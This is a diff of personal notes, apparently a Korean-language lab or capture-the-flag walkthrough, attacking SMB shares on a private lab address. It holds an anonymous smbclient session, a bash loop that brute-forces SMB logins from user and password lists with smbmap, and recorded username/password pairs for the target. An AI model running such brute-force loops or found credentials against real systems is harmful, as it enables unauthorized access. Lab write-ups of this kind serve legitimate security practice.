@@ -1261,6 +1261,7 @@ body {
 
 
 > smbclient
+> milesdyson/terminator22596
 
 ┌──(kali㉿kali)-[~]
 └─$ smbclient //10.48.183.145/anonymous -N
@@ -1274,3 +1275,17 @@ smb: \> ls
                 9204224 blocks of size 1024. 5831420 blocks available
 smb: \> 
 
+
+smbclient //<TARGET_IP>/<SHARE_NAME> -U <USERNAME>
+
+
+
+```bash
+# 재시도 실패
+# 사용자 목록과 패스워드 목록으로 SMB 접속 시도
+for u in $(cat users.txt); do for p in $(cat pass.txt); do echo "Testing $u:$p"; smbmap -u "$u" -p "$p" -H 10.48.183.145; done; done
+```
+
+
+> 모든 응답이 200 을 내 뱉어서 수동으로 로그인 시도
+> milesdyson/cyborg007haloterminator
